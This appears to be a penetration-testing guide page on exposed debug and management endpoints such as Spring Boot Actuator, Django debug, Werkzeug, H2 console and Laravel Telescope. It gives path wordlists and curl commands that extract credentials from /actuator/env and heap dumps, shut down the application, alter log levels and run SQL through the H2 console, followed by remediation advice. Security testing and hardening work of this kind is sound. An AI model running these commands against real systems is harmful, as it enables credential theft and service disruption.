# Debug Endpoints Exposed (/debug, /actuator, /console)

## Overview
Debug and management endpoints are built into many frameworks and application servers to aid development and operations — they expose metrics, configuration, heap dumps, thread states, and administrative controls. When left enabled or improperly secured in production environments, these endpoints become critical attack surfaces. Spring Boot Actuator, Django Debug Toolbar, Flask debug mode, Symfony profiler, Node.js inspector, and platform-specific management interfaces (JMX, JConsole) are among the most commonly exposed.

## How It Works
Frameworks like Spring Boot automatically expose actuator endpoints at `/actuator/*` when the dependency is on the classpath and security is not explicitly configured. Django sets `DEBUG=True` during development, enabling the `/debug/` toolbar and detailed error pages. Developers sometimes copy configuration directly from development to production, or assume that obscurity (unusual ports, long paths) provides sufficient protection. An attacker enumerates these well-known paths and finds unauthenticated access to operational data and controls.

## Impact
- Read application configuration including database credentials, API keys, and service passwords (`/actuator/env`, `/actuator/configprops`)
- Execute arbitrary OS commands via H2 console, Rails console, Flask shell, or Groovy script endpoints
- Trigger Heap/Thread dumps that may contain sensitive data in memory (passwords, session tokens)
- Map internal service topology from metrics and health data
- Obtain live request traces including HTTP headers and authentication tokens
- Modify application configuration at runtime
- Force application restart, shutdown, or cache clear
- Read application source code mapping files (`.map` files, sourcemaps)

## Where to Look
- Spring Boot Actuator endpoints (any Java/Spring application)
- Django Debug Toolbar (`/debug/`)
- Flask/Werkzeug debug console (`/console` or inline debugger in error pages)
- Symfony Profiler (`/_profiler/`)
- Laravel Telescope (`/telescope/`)
- Rails info/routes (`/rails/info/properties`, `/rails/info/routes`)
- Express/Node debug routes (`/debug`, `/__debug`)
- PHP info pages (`/info.php`, `/phpinfo.php`, `/test.php`)
- Grafana, Prometheus, Kibana on non-standard ports
- JMX/JConsole on high ports
- H2 database console (`/h2-console`)
- Webpack bundle analyzer, source maps (`.js.map` files)

## Testing Steps
1. Run a directory brute-force with a debug/admin wordlist against the target.
2. Specifically probe Spring Boot Actuator paths (see payloads section).
3. Check for Django debug page by triggering a 404: request `/DOESNOTEXIST` — if Django Debug is on, you get a styled error page with settings.
4. Check for Werkzeug console in Flask error pages — look for an interactive Python console in the 500 error page.
5. Try `/phpinfo.php`, `/info.php`, `/test.php` for PHP information pages.
6. Look for Symfony Profiler at `/_profiler/` — click the timeline icon for request profiling.
7. Check Laravel Telescope at `/telescope/requests`.
8. Check for H2 console at `/h2-console` — try default credentials (`sa` / empty password).
9. Probe monitoring tools: `:9090` (Prometheus), `:3000` (Grafana), `:5601` (Kibana).
10. Search HTML source and JavaScript files for debug API endpoint references.

## Payloads / Techniques

```
# === Spring Boot Actuator Endpoints ===
# Base path: /actuator/ (or /manage/, /management/)

/actuator
/actuator/health
/actuator/health/liveness
/actuator/info
/actuator/env                    # All environment variables + config (HIGH RISK)
/actuator/env/spring.datasource.password   # Specific env var
/actuator/configprops            # All @ConfigurationProperties (credentials)
/actuator/beans                  # Spring bean graph
/actuator/mappings               # All URL routes/mappings
/actuator/httptrace              # Last 100 HTTP requests w/ headers (CRITICAL)
/actuator/trace                  # Alias for httptrace
/actuator/sessions               # Active sessions (Spring Session)
/actuator/loggers                # Log level configuration
/actuator/metrics                # App metrics
/actuator/metrics/jvm.memory.used
/actuator/threaddump             # JVM thread dump
/actuator/heapdump               # Binary heap dump (CRITICAL - parse with tools)
/actuator/shutdown               # POST to shutdown app (if enabled)
/actuator/restart                # POST to restart
/actuator/refresh                # POST to reload config
/actuator/flyway                 # DB migration info
/actuator/liquibase              # DB migration info
/actuator/scheduledtasks         # Scheduled jobs
/actuator/caches                 # Cache details
/actuator/quartz                 # Quartz scheduler jobs

# Old Spring Boot 1.x paths
/health
/info
/env
/dump
/trace
/metrics
/autoconfig
/beans
/configprops
/mappings
/shutdown

# === Django Debug Endpoints ===
# Only exposed when DEBUG=True
/admin/                          # Django admin (check for default creds)
/__debug__/                      # Django Debug Toolbar
/debug/                         
/?debug=true                     
# Trigger 404 for verbose error page with settings:
/DOESNOTEXISTPATH1234

# Django REST Framework browsable API
/api/
/api/?format=json
/api-auth/

# === Flask / Werkzeug ===
# Werkzeug debugger PIN bypass (if Werkzeug debugger exposed):
# 1. Get server info from error page (hostname, Python path, MAC address)
# 2. Calculate PIN: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug

# === PHP Info Pages ===
/phpinfo.php
/info.php
/test.php
/php_info.php
/phpversion.php
/debug.php
/status.php

# === Symfony Profiler ===
/_profiler/
/_profiler/latest
/_profiler/empty/timeline
/_wdt/                           # Web Debug Toolbar token endpoint

# === Laravel Telescope ===
/telescope
/telescope/requests
/telescope/commands
/telescope/schedule
/telescope/jobs
/telescope/exceptions
/telescope/queries             # All DB queries (credentials!)
/telescope/models

# === Rails Debug ===
/rails/info/properties
/rails/info/routes
/rails/mailers

# === H2 Database Console ===
/h2-console
/h2-console/login.do
# Default credentials: username=sa, password=(empty)
# Once in: execute SQL → SELECT * FROM users

# === Node.js / Express ===
/debug
/__debug
/status
/admin
/metrics
# Node inspector (if port 9229 open):
# chrome://inspect -> configure 9229

# === Generic Debug Paths ===
/console
/admin/console
/manager
/jmx-console
/web-console
/server-status        # Apache mod_status
/server-info          # Apache mod_info
/nginx_status         # Nginx stub_status
/status               # Various
/health
/ping
/version
/build
/config
```

```bash
# Enumerate Spring Boot actuator endpoints
for endpoint in health info env configprops beans mappings httptrace trace threaddump heapdump metrics sessions loggers; do
  echo -n "/actuator/$endpoint: "
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/actuator/$endpoint"
  echo
done

# Extract credentials from actuator/env
curl -s "https://target.com/actuator/env" | python3 -m json.tool | grep -i "pass\|secret\|key\|token\|credential"

# Download heap dump and analyze
curl -s "https://target.com/actuator/heapdump" -o heap.hprof
# Analyze with Eclipse MAT or strings
strings heap.hprof | grep -i "password\|secret\|token" | head -50

# Brute force debug endpoints
ffuf -u "https://target.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/debug-endpoints.txt \
  -mc 200,301,302,403 \
  -t 30

# Check for Symfony profiler
curl -s "https://target.com/_profiler/" | grep -i "symfony\|profiler\|timeline"

# Werkzeug PIN extraction from debug error page
curl -s "https://target.com/trigger-error" | grep -i "werkzeug\|console\|PIN"
```

```bash
# Spring Boot Actuator: change log level to DEBUG (data extraction via logs)
curl -s -X POST "https://target.com/actuator/loggers/ROOT" \
  -H "Content-Type: application/json" \
  -d '{"configuredLevel": "DEBUG"}'

# Spring Boot: trigger shutdown (if endpoint exposed and enabled)
curl -s -X POST "https://target.com/actuator/shutdown"

# H2 console: execute SQL (if accessible)
curl -s -X POST "https://target.com/h2-console/query.do" \
  --data "sql=SELECT+*+FROM+INFORMATION_SCHEMA.TABLES&jsessionid=TOKEN"
```

## Burp Suite Tips
- Use **Target > Site Map** and right-click the target > **Engagement Tools > Discover Content** with a debug-endpoint-specific wordlist.
- Run the **Active Scanner** — Burp Pro detects exposed actuator endpoints and phpinfo pages automatically.
- In **Proxy > HTTP History**, filter by `Response type: HTML` and search for strings like "actuator", "profiler", "werkzeug", "django" to find accidentally exposed debug UIs.
- After discovering actuator endpoints, use **Repeater** to methodically pull each endpoint and save responses.
- Parse `heapdump` binary files offline with Eclipse MAT: `File > Open Heap Dump`.

## Tools
- Burp Suite Pro (Scanner, Content Discovery)
- ffuf with SecLists `/Discovery/Web-Content/` wordlists
- feroxbuster — recursive directory brute-force
- Nuclei with `exposed-panels`, `debug-page`, `spring-actuator` templates
- Eclipse MAT — Java heap dump analyzer
- strings (Unix) — extract readable text from heap/thread dumps
- Nikto — automatic debug endpoint checks
- dirsearch

## Remediation
- **Spring Boot**: set `management.endpoints.web.exposure.include=health,info` (or none) and secure actuator endpoints with Spring Security. Disable sensitive endpoints explicitly. Move actuator to a separate management port not exposed publicly.
- **Django**: set `DEBUG=False` in production. Store debug mode in environment variables, never in committed settings files.
- **Flask**: set `FLASK_ENV=production` and `app.run(debug=False)`.
- **PHP**: set `expose_php=Off` and `display_errors=Off` in `php.ini`. Remove all `phpinfo.php` files from production.
- **H2 Console**: disable it with `spring.h2.console.enabled=false` in production. Never use H2 in production at all.
- Apply authentication to all management and monitoring endpoints.
- Use a separate internal network/port for management interfaces, blocked by firewall from the public internet.

## References
https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/
https://portswigger.net/web-security/information-disclosure
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSTI%20(Server%20Side%20Template%20Injection)
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
https://cheatsheetseries.owasp.org/cheatsheets/Django_Security_Cheat_Sheet.html
